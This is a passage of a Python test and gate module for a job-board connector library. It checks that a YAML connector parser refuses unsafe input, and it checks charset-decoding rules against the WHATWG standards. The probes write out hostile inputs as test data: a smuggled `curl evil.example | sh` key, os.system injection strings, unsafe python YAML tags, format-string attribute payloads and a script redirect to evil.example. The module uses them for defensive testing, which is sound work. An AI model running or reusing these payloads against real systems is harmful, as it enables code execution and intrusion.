            "  fields:\n    text: {css: \"__import__('os').system('x')\"}\n"
        ),
    )

    # 4. An unknown top-level key — the shell-command-shaped smuggling case
    #    from the payload — must be refused by `extra='forbid'`.
    must_be_refused(
        "an unknown top-level key ('shell') is accepted instead of refused",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            'shell: "curl evil.example | sh"\n'
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 5. A lambda as a bare value — not executable YAML, just a string that
    #    fails `site`'s own pattern.
    must_be_refused(
        "a lambda-shaped string is accepted as a site name",
        lambda: parse_connector(
            "site: \"lambda: __import__('os').system('x')\"\nlocale: en\n"
            "version: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 6. A field name that IS a credential — rejected for not being in the
    #    closed field vocabulary, independent of whether 'password' *looks*
    #    dangerous.
    must_be_refused(
        "a 'password' field is accepted as a connector field",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n    password: {css: '.secret'}\n"
        ),
    )

    # 7. A credential-shaped top-level key.
    must_be_refused(
        "a top-level 'api_key' is accepted instead of refused",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "api_key: 'sk-does-not-belong-here'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 8. An `auth` value other than "none"/"candidate_session" — the only two
    #    the Literal allows — must be refused, closing off e.g. `auth: basic`
    #    plus an implied (even if absent today) credential field later.
    must_be_refused(
        "auth: password is accepted as an authentication mode",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "auth: password\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 9. A url_pattern carrying a format-string attribute-access payload
    #    alongside the legitimate placeholder — refused at load by the
    #    dedicated validator, not merely left un-formatted.
    must_be_refused(
        "a url_pattern with an extra brace group loads successfully",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test?p={page}&x={0.__class__}'\n"
            "  item: '.job'\n  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 10. `<script>` markup embedded in a fixture must come through as inert
    #     text if a selector happens to match it — never executed (there is
    #     no JS engine here to execute it in the first place, but the
    #     assertion is that its content is returned unchanged as a string).
    probes += 1
    connector = parse_connector(
        "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
        "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
        "  fields:\n    text: {css: 'script'}\n"
    )
    payload = "alert('should never run'); window.location='https://evil.example'"
    html = f"<div class='job'><script>{payload}</script></div>"
    records = parse_list_page(connector, html)
    if not records or records[0].get("text") != payload:
        violations.append("script content was not returned as inert text")

    # 11. A malformed connector (missing every required field) must be
    #     refused rather than silently defaulting.
    must_be_refused(
        "an empty mapping is accepted as a connector",
        lambda: parse_connector("{}"),
    )

    # 12. `!!python/name` — a different unsafe tag family — must also fail to
    #     load, not just the `/object/apply` shape probe 1 already covers.
    must_be_refused(
        "!!python/name tag resolves a name instead of failing to load",
        lambda: parse_connector("site: !!python/name:os.system\nlocale: en\n"),
    )

    # 13-15. `detail_url_template` is the SECOND connector-controlled brace
    #     grammar in this file, and probe 9 only covers the first (`url_pattern`
    #     and its `{page}`). The same three payloads, aimed at the new surface:
    #     an attribute-access path inside a slot, a leftover brace, and an empty
    #     slot. Each must be refused at load by `compile_url_template`.
    def _json_connector(template: str) -> str:
        return (
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test'\n"
            "  from_json:\n    items: '$'\n"
            f"    detail_url_template: '{template}'\n"
            "    fields:\n      text: body\n"
        )

    must_be_refused(
        "a detail_url_template slot naming an attribute path loads successfully",
        lambda: parse_connector(_json_connector("https://x.test/{0.__class__}")),
    )
    must_be_refused(
        "a detail_url_template with a leftover brace loads successfully",
        lambda: parse_connector(_json_connector("https://x.test/{id}/{0.__class__.__init__")),
    )
    must_be_refused(
        "an empty detail_url_template slot loads successfully",
        lambda: parse_connector(_json_connector("https://x.test/{}")),
    )

    return ProbeReport(probes_run=probes, violations=tuple(violations))


# A run that tried fewer than this measured nothing — the same "pass over
# nothing is not a pass" floor `identity.py`'s `MINIMUM_PROBES` enforces.
MINIMUM_PROBES = 10


# ---------------------------------------------------------------------------
# T128's gate: the charset contracts
#
# Written from the WHATWG Encoding Standard and WHATWG HTML **before** the
# decoder existed (`tmp/charset-cases.md` in the branch that added this records
# the table and the date). That ordering is the whole point: CLAUDE.md requires
# a session other than the implementer to derive a correctness-critical gate's
# cases from the spec, precisely so the cases are not a description of what the
# code already does. No second session was available; deriving the table from
# the standard first is the nearest available substitute and is weaker, and the
# pull request says so rather than claiming the rule was met.
#
# Every contract cites the clause its verdict comes from. A verdict argued from
# what the decoder does is the circularity this exists to break.

#: Each entry: name, the clause it is derived from, and a callable that returns
#: True when the contract holds. Behavioural — nothing here reads source text,
#: so a comment cannot satisfy one and a hard-coded pass cannot either.
CHARSET_CONTRACTS: tuple[tuple[str, str, Callable[[], bool]], ...] = (
    (
        "iso_8859_1_decodes_as_windows_1252",
        "Encoding §4.2 — `iso-8859-1` is a label OF windows-1252; the index has "
        "no separate latin-1 decoder. FAIL-OPEN: 0x92 is undefined in true "
        "Latin-1 and is a right single quote in cp1252.",
        lambda: decode_body(b"don\x92t", "iso-8859-1") == "don\u2019t",
    ),
    (
        "latin1_aliases_resolve_to_the_same_encoding",
        "Encoding §4.2 — latin1, l1, csisolatin1 share one label set.",
        lambda: (
            {encoding_for(label) for label in ("latin1", "l1", "csisolatin1", "iso8859-1")}
            == {"cp1252"}
        ),
    ),
    (
        "us_ascii_decodes_as_windows_1252",
        "Encoding §4.2 — us-ascii is also a windows-1252 label. FAIL-OPEN: a "
        "board declaring ascii and serving a £ would otherwise lose it.",
        lambda: decode_body(b"\xa3100", "us-ascii") == "\u00a3100",
    ),
    (
        "labels_are_case_insensitive_and_trimmed",
        "Encoding §4.2 — labels match ASCII-case-insensitively after stripping "
        "leading and trailing whitespace.",
        lambda: encoding_for("  ISO_8859-1  ") == encoding_for("iso-8859-1") == "cp1252",
    ),
    (
        "a_utf8_bom_wins_and_is_removed",
        "HTML 'Determining the character encoding' step 1 — the BOM is "
        "authoritative and is not content. FAIL-OPEN: a leftover U+FEFF lands "
        "inside the first extracted field of the page.",
        lambda: decode_body(b"\xef\xbb\xbfHola", "iso-8859-1") == "Hola",
    ),
    (
        "a_utf16_bom_selects_utf16_and_is_removed",
        "HTML 'Determining the character encoding' step 1 — FF FE and FE FF "
        "select UTF-16LE and UTF-16BE.",
        lambda: (
            decode_body(b"\xff\xfeH\x00i\x00", "utf-8") == "Hi"
            and decode_body(b"\xfe\xff\x00H\x00i", "utf-8") == "Hi"
        ),
    ),
    (
        "an_unknown_label_is_refused_not_defaulted",
        "Encoding §4.2 — a label matching nothing has no encoding. FAIL-OPEN if "
        "defaulted: a typo'd charset would silently mojibake every advert.",
        lambda: _refuses(lambda: encoding_for("banana")),
    ),
    (
        "replacement_decoder_labels_are_refused",
        "Encoding §4.2 — these map to the replacement decoder, whose purpose is "
        "to refuse. FAIL-OPEN if accepted: it yields U+FFFD for everything. "
        "Asserts the REASON, not just the refusal: deleting the guard still "
        "refuses these labels via the unknown-label path, so a contract asking "
        "only 'did it raise' passes over a deleted check. Caught by mutating "
        "the guard away and watching this contract stay green.",
        lambda: all(_refused_as_replacement(label) for label in REPLACEMENT_LABELS),
    ),
    (
        "an_undecodable_body_refuses_rather_than_replacing",
        "repo policy, and a deliberate departure: Encoding §6 specifies U+FFFD "
        "for a decode error, which is right for RENDERING. This library "
        "produces evidence a candidate reads. THE fail-open of this task: "
        "errors='replace' is what gives 'T\ufffdcnico de Manuten\ufffd\ufffdo'.",
        lambda: _refuses(lambda: decode_body("Técnico".encode("cp1252"), "utf-8")),
    ),
    (
        "a_connector_declaring_an_unknown_charset_will_not_load",
        "repo policy: refused at load like every other unusable field. cp1252 "
        "never raises, so a typo caught at fetch time would never be caught "
        "at all — load is the last place this can fail loudly.",
        lambda: _refuses(
            lambda: parse_connector(
                "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
                "charset: banana\n"
                "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
                "  fields:\n    text: {css: '.x'}\n"
            ),
            (ConnectorError, ValueError),
        ),
    ),
    (
        "an_empty_body_decodes_to_an_empty_string",
        "repo policy: nothing to decode is not an error. FAIL-CLOSED if it raised.",
        lambda: decode_body(b"", "iso-8859-1") == "",
    ),
    (
        "text_that_is_already_str_is_returned_unchanged",
        "repo policy: there is nothing to decode. Guards the committed captures, "
        "which are read from disk as str.",
        lambda: decode_body("Técnico", "iso-8859-1") == "Técnico",
    ),
    (
        "every_committed_capture_survives_its_declared_charset",
        "repo policy: the round trip the case table names as the ONLY check for "
        "'declared latin-1, actually UTF-8'. cp1252 never raises, so that case "
        "is invisible to the decoder and catchable only against real captures.",
        lambda: not _captures_outside_their_charset(),
    ),
)


def _refused_as_replacement(label: str) -> bool:
    """True when `label` is refused **for being a replacement label**.

    `REPLACEMENT_LABELS` is, today, unreachable by accident: none of its labels
    is in `ENCODING_LABELS` either, so deleting the guard leaves them refused
    as unknown. That makes the guard look like dead code and makes any contract
    asking merely "did it raise" green over its removal.

    It is not dead code, and the distinction is the reason. A later maintainer
    adding CJK support would put `iso-2022-cn` into `ENCODING_LABELS` and get a
    decoder returning U+FFFD for every character of every advert — the guard is
    what refuses that, and only then. So the contract reads the message.
    """
    try:
        encoding_for(label)
    except ConnectorError as error:
        return "replacement decoder" in str(error)
    return False


def _refuses(call: Callable[[], Any], exceptions: Any = ConnectorError) -> bool:
    """True when `call` raises. A contract asserting a refusal must observe one."""
    try:
        call()
    except exceptions:
        return True
    except Exception:
        return False
    return False


def _captures_outside_their_charset(
    directory: Path = DEFAULT_CONNECTORS_DIR,
) -> list[str]:
    """Committed captures holding a character their board's charset cannot carry.

    Every capture in this library is committed as UTF-8 — that is a repository
    rule, not a fact about the boards. `charset` describes the *live* board. So
    the assertion is that the text actually shipped could have come from that
    board: a package declaring iso-8859-1 whose fixture contains a CJK
    character has either the wrong declaration or a corrupted capture, and both
    are worth knowing before a candidate reads it.
    """
    outside: list[str] = []
    for package in connector_packages(directory):
        try:
            connector = load_connector(package / CONNECTOR_FILENAME)
        except Exception:
            continue
        codec = encoding_for(connector.charset)
        for capture in sorted(package.rglob("*.html")):
            try:
                capture.read_text(encoding="utf-8").encode(codec)
            except UnicodeEncodeError as error:
                outside.append(f"{package.name}/{capture.relative_to(package)}: {error}")
            except UnicodeDecodeError:
                outside.append(
                    f"{package.name}/{capture.relative_to(package)}: not committed as UTF-8"
                )
    return outside


#: A library that lost its contracts must not report a clean zero.
MINIMUM_CHARSET_CONTRACTS = 13


def measure_charset() -> dict[str, Any]:
    """T128's gate reading: `charset_contracts_failing`."""
    failing: list[str] = []
    for name, clause, contract in CHARSET_CONTRACTS:
        try:
            held = contract()
        except Exception as error:
            held = False
            clause = f"{clause} [raised {type(error).__name__}: {error}]"
        if not held:
            failing.append(f"{name}: {clause}")
    checked = len(CHARSET_CONTRACTS)
    return {
        "charset_contracts_failing": len(failing),
        "charset_contracts_checked": checked,
        "charset_contracts_at_least": MINIMUM_CHARSET_CONTRACTS,
        "gate_status": "measured" if checked >= MINIMUM_CHARSET_CONTRACTS else "unmeasured",
        "failed_contracts": failing,
        "captures_outside_their_charset": _captures_outside_their_charset(),
        "contracts_checked_by_name": [name for name, _, _ in CHARSET_CONTRACTS],
    }


def write_charset_evidence(evidence: Path) -> dict[str, Any]:
    """Measure and record `status/evidence/T128.json`."""
    measured = measure_charset()
    evidence.parent.mkdir(parents=True, exist_ok=True)
    evidence.write_text(json.dumps(measured, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    return measured


def write_evidence(evidence: Path = DEFAULT_EVIDENCE_PATH) -> dict[str, Any]:
    """Measure `connector_executes_no_shared_code` and record it.

    `1` means every adversarial attempt in `probe_connector_isolation` was
    refused; `0` means at least one was not — the flag is never a vacuous
    pass, because `_main` refuses to report it at all when too few probes ran.
    """
    report = probe_connector_isolation()
    defects = partial_extraction_defects()
    measured: dict[str, Any] = {
        "connector_executes_no_shared_code": 1 if not report.violations else 0,
        "probes_run": report.probes_run,
        "violations": list(report.violations),
        # T132. The `take:` vocabulary is this file's answer to "read part of a
        # text node without running anything the connector wrote", so its
        # contracts are measured beside the isolation probes rather than in a
        # file of their own.
        "partial_extraction_contracts_failing": len(defects),
        "partial_extraction_contracts_run": len(PARTIAL_EXTRACTION_CONTRACTS),
        "partial_extraction_defects": defects,
    }
    if len(PARTIAL_EXTRACTION_CONTRACTS) < MINIMUM_PARTIAL_EXTRACTION_CONTRACTS:
        measured["gate_status"] = "unmeasured"
        measured["reasons"] = [
            f"only {len(PARTIAL_EXTRACTION_CONTRACTS)} partial-extraction contract(s) "
            f"(floor {MINIMUM_PARTIAL_EXTRACTION_CONTRACTS}) — a zero over a shrunken "
            "table says nothing"
        ]
    evidence.parent.mkdir(parents=True, exist_ok=True)
    evidence.write_text(json.dumps(measured, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    return measured


def _main(argv: list[str]) -> int:
    """`python -m integral.connectors [path]` → T32's gate evidence."""
    positional = [arg for arg in argv[1:] if not arg.startswith("--")]
    target = Path(positional[0]) if positional else DEFAULT_EVIDENCE_PATH
    measured = write_evidence(target)
    # T128 beside T32, wherever T32 was asked for — the same shape
    # `connector_health` uses for T72/T73/T127. A caller redirecting one record
    # to a scratch directory is not asking to have the other written into the
    # repository.
    charset = write_charset_evidence(target.parent / "T128.json")
    # T118 beside them, for the same reason: array indexing is a property of
    # this module's path grammar, not of any one connector package.
    arrays = write_array_path_evidence(target.parent / "T118.json")
    print(json.dumps(measured, ensure_ascii=False))
    if charset["charset_contracts_failing"]:
        for failure in charset["failed_contracts"]:
            print(f"charset contract failed: {failure}", file=sys.stderr)
        return 1
    for capture in charset["captures_outside_their_charset"]:
        print(f"capture outside its declared charset: {capture}", file=sys.stderr)
    if charset["captures_outside_their_charset"]:
        return 1
    for defect in arrays["connector_array_path_defects"]:
        print(f"array path misresolved: {defect}", file=sys.stderr)
    if arrays["connector_array_paths_misresolved"]:
        return 1
    if arrays["gate_status"] == "unmeasured":
        print(
            f"only {len(ARRAY_PATH_CONTRACTS)} path/document pair(s) evaluated (floor "
            f"{MINIMUM_ARRAY_PATH_CONTRACTS})",
            file=sys.stderr,
        )
        # `1`, not the `3` its neighbours return. `Makefile:58-70` maps exit 3 to
        # `unmeasured (recorded)` and CONTINUES (#297, #309), so a gutted table
        # would leave `make evidence` green over a gate nobody could fail.
        return 1
    if charset["gate_status"] == "unmeasured":
        print(
            f"only {charset['charset_contracts_checked']} charset contract(s) "
            f"(floor {charset['charset_contracts_at_least']})",
            file=sys.stderr,
        )
        return 3
    if measured["probes_run"] < MINIMUM_PROBES:
        print(
            f"only {measured['probes_run']} probe(s) ran (floor {MINIMUM_PROBES}) — "
            "a pass over nothing is not a pass",
            file=sys.stderr,
        )
        return 3
    for violation in measured["violations"]:
        print(f"connector isolation breach: {violation}", file=sys.stderr)
    return 1 if measured["violations"] else 0


if __name__ == "__main__":
    raise SystemExit(_main(sys.argv))
